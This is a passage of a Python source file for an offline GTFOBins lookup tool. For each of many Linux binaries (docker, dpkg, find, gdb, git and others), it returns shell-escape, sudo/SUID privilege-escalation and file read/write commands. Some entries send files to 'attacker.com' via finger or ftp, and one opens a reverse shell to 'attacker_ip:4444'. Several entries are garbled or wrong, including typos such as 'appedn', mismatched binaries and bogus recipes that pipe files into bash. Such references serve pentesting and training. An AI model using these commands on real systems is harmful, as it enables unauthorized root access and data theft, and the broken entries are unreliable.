        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which docker) .\n./docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
        elif zip_options == "Shell":
            bins.append("docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
        elif zip_options == "file-write":
            bins.append("CONTAINER_ID=""$(docker run -d alpine)"" # or existing\nTF=$(mktemp)\necho ""DATA"" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF file_to_write")
        elif zip_options == "file-read":
            bins.append("CONTAINER_ID=""$(docker run -d alpine)""  # or existing\nTF=$(mktemp)\ndocker cp file_to_read $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF $TF\ncat $TF")

    elif zip_command == "dos2unix":
        if zip_options == "file-write":
            bins.append("LFILE1=file_to_read\nLFILE2=file_to_write\ndos2unix -f -n ""$LFILE1"" ""$LFILE2""")
        elif zip_options == "file-read":
            bins.append("LFILE2=file_to_read\ndos2unix -f -n ""$LFILE2""")
        elif zip_options == "sudo":
            bins.append("LFILE1=file_to_read\nLFILE2=file_to_write\nsudo dos2unix -f -n ""$LFILE1"" ""$LFILE2""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which dos2unix) .\nLFILE1=file_to_read\nLFILE2=file_to_write\ndos2unix -f -n ""$LFILE1"" ""$LFILE2""")
        elif zip_options == "Shell":
            bins.append("dos2unix script.sh")

    elif zip_command == "dotnet":
        if zip_options == "sudo":
            bins.append("sudo dotnet fsi\nSystem.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;")
        elif zip_options == "Shell":
            bins.append("dotnet fsi\nSystem.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;")
        elif zip_options == "file-read":
            bins.append("export LFILE=file_to_read\ndotnet fsi\nSystem.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;")
        elif zip_options == "file-write":
            bins.append("export LFILE=file_to_write\ndotnet fsi\nSystem.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which dos2unix) .\nsudo dotnet fsi\nSystem.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;")

    elif zip_command == "dpkg":
        if zip_options == "sudo":
            bins.append("sudo dpkg -l\n!/bin/sh")
        elif zip_options == "Shell":
            bins.append("dpkg -l\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("dpkg --listfiles <package_name>")
        elif zip_options == "file-write":
            bins.append("dpkg-deb -x <package_name>.deb /tmp/package_contents")
        elif zip_options == "suid":
            bins.appedn("sudo chmod u+s /usr/bin/dpkg")

    elif zip_command == "dstat":
        if zip_options == "sudo":
            bins.append("echo 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx")
        elif zip_options == "Shell":
            bins.append("mkdir -p ~/.dstat\necho 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx")
        elif zip_options == "file-write":
            bins.append("dstat >> /path/to/output_file.txt")
        elif zip_options == "file-read":
            bins.append("cat /path/to/output_file.csv")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which dos2unix) .\necho 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx")

    elif zip_command == "dvips":
        if zip_options == "sudo":
            bins.append("tex '\special{psfile=""`/bin/sh 1>&0""}\end'\nsudo dvips -R0 texput.dvi")
        elif zip_options == "Shell":
            bins.append("tex '\special{psfile=""`/bin/sh 1>&0""}\end'\ndvips -R0 texput.dvi")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which dvips) .\ntex '\special{psfile=""`/bin/sh 1>&0""}\end'\nsudo dvips -R0 texput.dvi")
        elif zip_options == "file-read":
            bins.append("dvips -o output.ps")
        elif zip_options == "file-write":
            bins.append("dvips input.dvi -o /path/to/output_directory/filename.ps")

    elif zip_command == "easy_install":
        if zip_options == "sudo":
            bins.append("TF=$(mktemp -d)\necho ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py\nsudo easy_install $TF")
        elif zip_options == "Shell":
            bins.append("TF=$(mktemp -d)\necho ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py\neasy_install $TF")
        elif zip_options == "file-write":
            bins.append("export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho ""import os; os.execl('$(whereis python)', 'python', '-c', 'open(\"$LFILE\",\"w+\").write(\"DATA\")')"" > $TF/setup.py\neasy_install $TF")
        elif zip_options == "file-read":
            bins.append("TF=$(mktemp -d)\necho 'print(open(""file_to_read"").read())' > $TF/setup.py\neasy_install $TF")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which easy_install) .\nTF=$(mktemp -d)\necho ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py\nsudo easy_install $TF")

    elif zip_command == "eb":
        if zip_options == "Shell":
            bins.append("eb logs\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo eb logs\n!/bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which eb) .\nsudo eb logs\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("eb logs")
        elif zip_options == "file-write":
            bins.append("echo ""New content"" > /path/to/file.txt")

    elif zip_command == "ed":
        if zip_options == "Shell":
            bins.append("ed\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo ed\n!/bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ed) .\n./ed file_to_read\n,p\nq")
        elif zip_options == "file-write":
            bins.append("ed file_to_write\na\nDATA\n.\nw\nq")
        elif zip_options == "file-read":
            bins.append("ed file_to_read\n,p\nq")

    elif zip_command == "efax":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo efax -d ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which efax) .\nLFILE=file_to_read\n./efax -d ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("efax -d /dev/modem -n 1234567890 -t ""Recipient Name"" -F ""Sender Name"" file-to-send.txt")
        elif zip_options == "file-write":
            bins.append("efax -d /dev/modem -r received_fax.tiff > efax_log.txt 2>&1")
        elif zip_options == "Shell":
            bins.append("efax -d /dev/modem -r received_fax.tiff\nbash")

    elif zip_command == "elvish":
        if zip_options == "Shell":
            bins.append("elvish")
        elif zip_options == "sudo":
            bins.append("sudo elvish")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which elvish) .\n./elvish")
        elif zip_options == "file-write":
            bins.append("export LFILE=file_to_write\nelvish -c 'echo DATA >$E:LFILE'")
        elif zip_options == "file-read":
            bins.append("export LFILE=file_to_read\nelvish -c 'echo (slurp <$E:LFILE)'")

    elif zip_command == "emacs":
        if zip_options == "Shell":
            bins.append("emacs -Q -nw --eval '(term ""/bin/sh"")'")
        elif zip_options == "sudo":
            bins.append("sudo emacs -Q -nw --eval '(term ""/bin/sh"")'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which emacs) .\n./emacs -Q -nw --eval '(term ""/bin/sh -p"")'")
        elif zip_options == "file-read":
            bins.append("emacs file_to_read")
        elif zip_options == "file-write":
            bins.append("emacs file_to_write\nDATA\nC-x C-s")

    elif zip_command == "enscript":
        if zip_options == "Shell":
            bins.append("enscript /dev/null -qo /dev/null -I '/bin/sh >&2'")
        elif zip_options == "sudo":
            bins.append("sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'")
        elif zip_options == "file-read":
            bins.append("enscript file.txt -o output.txt")
        elif zip_options == "file-write":
            bins.append("enscript file.txt > output.ps")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which enscript) .\nsudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'")

    elif zip_command == "env":
        if zip_options == "Shell":
            bins.append("env /bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo env /bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which env) .\n./env /bin/sh -p")
        elif zip_options == "file-read":
            bins.append("env $(cat envfile) bash -c 'echo $VAR1 $VAR2'")
        elif zip_options == "file-write":
            bins.append("env PATH=/custom/path echo ""SCRIPT"" > output.txt")

    elif zip_command == "eqn":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo eqn ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which eqn) .\nLFILE=file_to_read\n./eqn ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\neqn ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("eqn equations.txt | groff -ms > output.ps")
        elif zip_options == "Shell":
            bins.append("eqn - <(echo "".EQ; x = (-b +- sqrt(b^2 - 4ac)) / 2a; .EN"") | groff -ms && bash")

    elif zip_command == "espeak":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo espeak -qXf ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which espeak) .\nLFILE=file_to_read\n./espeak -qXf ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nespeak -qXf ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("echo ""This is an example text for espeak."" > example.txt && espeak -f example.txt")
        elif zip_options == "Shell":
            bins.append("espeak ""Now spawning a new shell"" && bash")

    elif zip_command == "ex":
        if zip_options == "Shell":
            bins.append("ex\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo ex\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("ex file_to_read\n,p\nq")
        elif zip_options == "file-write":
            bins.append("ex file_to_write\na\nDATA\n.\nw\nq")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ex) .\nsudo ex\n!/bin/sh")

    elif zip_command == "exiftool":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nINPUT=input_file\nexiftool -filename=$LFILE $INPUT")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nOUTPUT=output_file\nexiftool -filename=$OUTPUT $LFILE\ncat $OUTPUT")
        elif zip_options == "Shell":
            bins.append("exiftool -Comment=""$(echo 'bash' | base64)"" example.jpg && bash")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which exiftool) .\nLFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT")

    elif zip_command == "expand":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo expand ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nexpand ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which expand) .\nLFILE=file_to_read\n./expand ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("expand sample.txt > expanded_sample.txt")
        elif zip_options == "Shell":
            bins.append("expand sample.txt > expanded_sample.txt && bash")

    elif zip_command == "expect":
        if zip_options == "Shell":
            bins.append("expect -c 'spawn /bin/sh;interact'")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nexpect $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which expect) .\n./expect -c 'spawn /bin/sh -p;interact'")
        elif zip_options == "sudo":
            bins.append("sudo expect -c 'spawn /bin/sh;interact'")
        elif zip_options == "file-write":
            bins.append("expect -c 'spawn ssh your-username@your-remote-server; expect ""password:""; send ""your-password\r""; interact'")

    elif zip_command == "facter":
        if zip_options == "sudo":
            bins.append("TF=$(mktemp -d)\necho 'exec(""/bin/sh"")' > $TF/x.rb\nsudo FACTERLIB=$TF facter")
        elif zip_options == "Shell":
            bins.append("TF=$(mktemp -d)\necho 'exec(""/bin/sh"")' > $TF/x.rb\nFACTERLIB=$TF facter")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which facter) .\nTF=$(mktemp -d)\necho 'exec(""/bin/sh"")' > $TF/x.rb\nsudo FACTERLIB=$TF facter")
        elif zip_options == "file-write":
            bins.append("facter > system_facts.txt")
        elif zip_options == "file-read":
            bins.append("facter --custom_fact=$(cat filename.txt)")

    elif zip_command == "file":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\nfile -f $LFILE")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo file -f $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which file) .\nLFILE=file_to_read\n./file -f $LFILE")
        elif zip_options == "file-write":
            bins.append("file file.txt > output.txt")
        elif zip_options == "Shell":
            bins.append("file script.sh (MUST MAKE A SHELL SCRIPT)")

    elif zip_command == "find":
        if zip_options == "Shell":
            bins.append("find . -exec /bin/sh \; -quit")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nfind / -fprintf ""$FILE"" DATA -quit")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which find) .\n./find . -exec /bin/sh -p \; -quit")
        elif zip_options == "sudo":
            bins.append("sudo find . -exec /bin/sh \; -quit")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nfind / -fprintf ""$FILE"" DATA -quit")

    elif zip_command == "finger":
        if zip_options == "Shell":
            bins.append("RHOST=attacker.com\nLFILE=file_to_send\nfinger ""$(base64 $LFILE)@$RHOST""")
        elif zip_options == "file-read":
            bins.append("RHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("finger user > user_info.txt")
        elif zip_options == "sudo":
            bins.append("RHOST=attacker.com\nLFILE=file_to_send\nsudo finger ""$(base64 $LFILE)@$RHOST""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which finger) .\nRHOST=attacker.com\nLFILE=file_to_send\n./finger ""$(base64 $LFILE)@$RHOST""")

    elif zip_command == "fish":
        if zip_options == "Shell":
            bins.append("fish")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which fish) .\n./fish")
        elif zip_options == "sudo":
            bins.append("sudo fish")
        elif zip_options == "file-read":
            bins.append("cat file.txt")
        elif zip_options == "file-write":
            bins.append("echo ""SCRIPT"" > file.txt")

    elif zip_command == "flock":
        if zip_options == "Shell":
            bins.append("flock -u / /bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which flock) .\n./flock -u / /bin/sh -p")
        elif zip_options == "sudo":
            bins.append("sudo flock -u / /bin/sh")
        elif zip_options == "file-write":
            bins.append("flock /tmp/mylockfile -c 'echo ""New content"" > /path/to/file'")
        elif zip_options == "file-read":
            bins.append("flock -x /tmp/mylockfile cat /path/to/file")

    elif zip_command == "fmt":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\nfmt -pNON_EXISTING_PREFIX ""$LFILE""")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo fmt -pNON_EXISTING_PREFIX ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which fmt) .\nLFILE=file_to_read\n./fmt -999 ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("flock -x /tmp/mylockfile -c ""fmt /path/to/inputfile > /path/to/outputfile""")
        elif zip_options == "Shell":
            bins.append("bash -c 'fmt /path/to/inputfile > /path/to/outputfile'")

    elif zip_command == "fold":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\nfold -w99999999 ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which fold) .\nLFILE=file_to_read\n./fold -w99999999 ""$LFILE""")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo fold -w99999999 ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("fold -w 1000 /dev/null > /tmp/exploit.sh && chmod +x /tmp/exploit.sh && /tmp/exploit.sh")
        elif zip_options == "Shell":
            bins.append("sudo fold -w 1000 /dev/null | bash -i >& /dev/tcp/attacker_ip/4444 0>&1")

    elif zip_command == "fping":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\nfping -f $LFILE")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo fping -f $LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nfping -f $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which fping) .\nLFILE=file_to_read\nsudo fping -f $LFILE")
        elif zip_options == "Shell":
            bins.append("fping -a 127.0.0.1 | bash")

    elif zip_command == "ftp":
        if zip_options == "Shell":
            bins.append("ftp\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo ftp\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("RHOST=attacker.com\nftp $RHOST\nput file_to_send")
        elif zip_options == "file-write":
            bins.append("put reverse_shell.sh /var/www/html/reverse_shell.sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ftp) .\nsudo ftp\n!/bin/sh")

    elif zip_command == "gawk":
        if zip_options == "Shell":
            bins.append("gawk 'BEGIN {system(""/bin/sh"")}'")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ngawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ngawk '//' ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which gawk) .\nLFILE=file_to_read\n./gawk '//' ""$LFILE""")
        elif zip_options == "sudo":
            bins.append("sudo gawk 'BEGIN {system(""/bin/sh"")}'")

    elif zip_command == "gcloud":
        if zip_options == "Shell":
            bins.append("gcloud help\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo gcloud help\n!/bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which gcloud) .\n./gcloud help\n!/bin/sh")
        elif zip_options == "file-read":
            bins,append("gsutil cat gs://[BUCKET_NAME]/[FILE_PATH]")
        elif zip_options == "file-write":
            bins.append("gsutil cp [LOCAL_FILE_PATH] gs://[BUCKET_NAME]/[DESTINATION_PATH]")

    elif zip_command == "gcore":
        if zip_options == "file-read":
            bins.append("gcore $PID")
        elif zip_options == "sudo":
            bins.append("sudo gcore $PID")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which gcore) .\n./gcore $PID")
        elif zip_options == "Shell":
            bins.append("bash &\nsudo gcore -o core_dump [PID]")
        elif zip_options == "file-write":
            bins.append("gcore -o [output_file_prefix] [PID]")

    elif zip_command == "gdb":
        if zip_options == "Shell":
            bins.append("gdb -nx -ex '!sh' -ex quit")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ngdb -nx -ex ""dump value $LFILE \"DATA\""" -ex quit")
        elif zip_options == "file-read":
            bins.append("gdb -nx -ex 'python print(open(""file_to_read"").read())' -ex quit")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which gdb) .\n./gdb -nx -ex 'python import os; os.execl(""/bin/sh"", ""sh"", ""-p"")' -ex quit")
        elif zip_options == "sudo":
            bins.append("sudo gdb -nx -ex '!sh' -ex quit")

    elif zip_command == "gem":
        if zip_options == "Shell":
            bins.append("gem open -e ""/bin/sh -c /bin/sh"" rdoc")
        elif zip_options == "file-write":
            bins.append("TF=$(mktemp -d)\necho 'system(""/bin/sh"")' > $TF/x\ngem build $TF/x")
        elif zip_options == "file-read":
            bins.append("gem open rdoc\n:!/bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which gem) .\n./gem open -e ""/bin/sh -c /bin/sh"" rdoc")
        elif zip_options == "sudo":
            bins.append("sudo gem open -e ""/bin/sh -c /bin/sh"" rdoc")

    elif zip_command == "genie":
        if zip_options == "Shell":
            bins.append("genie -c '/bin/sh'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which genie) .\n./genie -c '/bin/sh'")
        elif zip_options == "sudo":
            bins.append("sudo genie -c '/bin/sh'")
        elif zip_options == "file-read":
            bins.append("genie -s\ncat /path/to/file.txt")
        elif zip_options == "file-write":
            bins.append("echo ""SCRIPT"" > /path/to/file.txt")

    elif zip_command == "genisoimage":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\ngenisoimage -q -o - ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which genisoimage) .\nLFILE=file_to_read\n./genisoimage -sort ""$LFILE""")
        elif zip_options == "sudo":
            bins.append("sudo LFILE=file_to_read\ngenisoimage -q -o - ""$LFILE""")            
        elif zip_options == "Shell":
            bins.append("genisoimage -o /path/to/output.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -R -J /path/to/bootable/directory && echo -e ""DEFAULT linux\nLABEL linux\n  KERNEL /boot/vmlinuz\n  APPEND init=/bin/bash"" > /path/to/bootable/directory/isolinux/isolinux.cfg")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ngenisoimage -q -o - ""$LFILE""")

    elif zip_command == "ghc" or zip_command == "ghci":
        if zip_options == "Shell":
            bins.append("ghc -e 'System.Process.callCommand ""/bin/sh""'")
        elif zip_options == "sudo":
            bins.append("sudo ghc -e 'System.Process.callCommand ""/bin/sh""'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ghc) .\n./ghc -e 'System.Process.callCommand ""/bin/sh""'")
        elif zip_options == "file-write":
            bins.append("ghc -o output_file input_file.hs")
        elif zip_options == "file-read":
            bins.append("ghc -o readFileProgram ReadFile.hs")

    elif zip_command == "gimp":
        if zip_options == "Shell":
            bins.append("gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'")
        elif zip_options == "file-write":
            bins.append("gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'")
        elif zip_options == "file-read":
            bins.append("gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(""file_to_read"").read())'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which gimp) .\n./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'")
        elif zip_options == "sudo":
            bins.append("sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'")

    elif zip_command == "ginsh":
        if zip_options == "Shell":
            bins.append("ginsh\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo ginsh\n!/bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ginsh) .\n./ginsh\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("cat /path/to/file.txt")
        elif zip_options == "file-write":
            bins.append("echo ""SCRIPT"" > /path/to/file.txt")

    elif zip_command == "git":
        if zip_options == "Shell":
            bins.append("git help config\n!/bin/sh")
        elif zip_options == "file-write":
            bins.append("git apply --unsafe-paths --directory / x.patch")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ngit diff /dev/null $LFILE")
        elif zip_options == "sudo":
            bins.append("sudo git help config\n!/bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which git) .\nPAGER='sh -c ""exec sh 0<&1""' ./git -p help")

    elif zip_command == "grc":
        if zip_options == "Shell":
            bins.append("grc --pty /bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo grc --pty /bin/sh")
        elif zip_options == "file-read":
            bins.append("grc cat filename.txt")
        elif zip_options == "file-write":
            bins.append("grc echo "" > filename.txt")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which grc) .\ngrc --pty /bin/sh")

    elif zip_command == "grep":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\ngrep '' $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which grep) .\nLFILE=file_to_read\n./grep '' $LFILE")
        elif zip_options == "sudo":
            bins.append("sudo LFILE=file_to_read\ngrep '' $LFILE")
        elif zip_options == "Shell":
            bins.append("echo ""Hello World"" | grep -q ""Hello"" && bash")
        elif zip_options == "file-write":
            bins.append("grep ""pattern"" file.txt > output.txt")

    elif zip_command == "gtester":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ngtester ""DATA"" -o $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which gtester) .\nTF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF")
        elif zip_options == "sudo":
            bins.append("sudo TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ngtester ""DATA"" -o $LFILE")

    elif zip_command == "gzip":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\ngzip -f $LFILE -t")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which gzip) .\nLFILE=file_to_read\n./gzip -f $LFILE -t")
        elif zip_options == "sudo":
            bins.append("sudo LFILE=file_to_read\ngzip -f $LFILE -t")
        elif zip_options == "Shell":
            bins.append("echo -n ""bash"" | gzip > bash_one_liner.gz\ngzip -dc bash_one_liner.gz | bash")
        elif zip_options == "file-write":
            bins.append("gzip -c myfile.txt > myfile.txt.gz")

    elif zip_command == "hd":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\nhd ""$LFILE""")
        elif zip_options == "sudo":
            bins.append("sudo LFILE=file_to_read\nhd ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which hd) .\nLFILE=file_to_read\n./hd ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("hd input.txt > output.txt")
        elif zip_options == "Shell":
            bins.append("bash -c ""hd somefile.bin; exec bash""")

    elif zip_command == "head":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\nhead -c1G ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which head) .\nLFILE=file_to_read\n./head -c1G ""$LFILE""")      
        elif zip_options == "sudo":
            bins.append("sudo LFILE=file_to_read\nhead -c1G ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("head input.txt > output.txt")
        elif zip_options == "Shell":
            bins.append("head input.txt | bash")

    elif zip_command == "hexdump":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\nhexdump -C ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which hexdump) .\nLFILE=file_to_read\n./hexdump -C ""$LFILE""")
        elif zip_options == "sudo":
            bins.append("sudo LFILE=file_to_read\nhexdump -C ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("hexdump input.txt > output.txt")
        elif zip_options == "Shell":
            bins.append("hexdump input.txt | bash")

    elif zip_command == "highlight":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\nhighlight --no-doc --failsafe ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which highlight) .\nLFILE=file_to_read\n./highlight --no-doc --failsafe ""$LFILE""")
        elif zip_options == "sudo":
            bins.append("sudo LFILE=file_to_read\nhighlight --no-doc --failsafe ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("highlight -O <output-format> <input-file> > <output-file>")
        elif zip_options == "Shell":
            bins.append("highlight -O html input.c > output.html; bash")

    elif zip_command == "hping3":
        if zip_options == "Shell":
            bins.append("hping3\n/bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which hping3) .\n./hping3\n/bin/sh -p")
        elif zip_options == "sudo":
            bins.append("sudo hping3\n/bin/sh")
        elif zip_options == "file-write":
            bins.append("hping3 -S -p 80 example.com > output.txt")
        elif zip_options == "file-read":
            bins.append("hping3 -d $(wc -c < file.txt) -S -p 80 --data ""$(cat file.txt)"" target_ip")



#If there are any other misconfigurations run the other option
    elif zip_command == "other":
        if zip_options == "Shell": #This will print out hints for more GTFO bins!
            bins.append("Please refer to the GTFO bins website for more!")
        elif zip_options == "sudo": #This will give a git clone command to run when more bins are needed but available
            bins.append("If git is install please run \ngit clone https://github.com/GTFOBins/GTFOBins.github.io.git\nThen cd into the directory and then into the folder marked _gtfobins")
            
    return bins

def main():
    print_logo()
    print("*If a GTFO bin is not found please type 'other' then 'sudo'*")
    start = input("Off-Grid, the offline GTFO Bin lookup tool, what is misconfigured?\n")

    #Tool selection for Linux misconfigurations
    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start 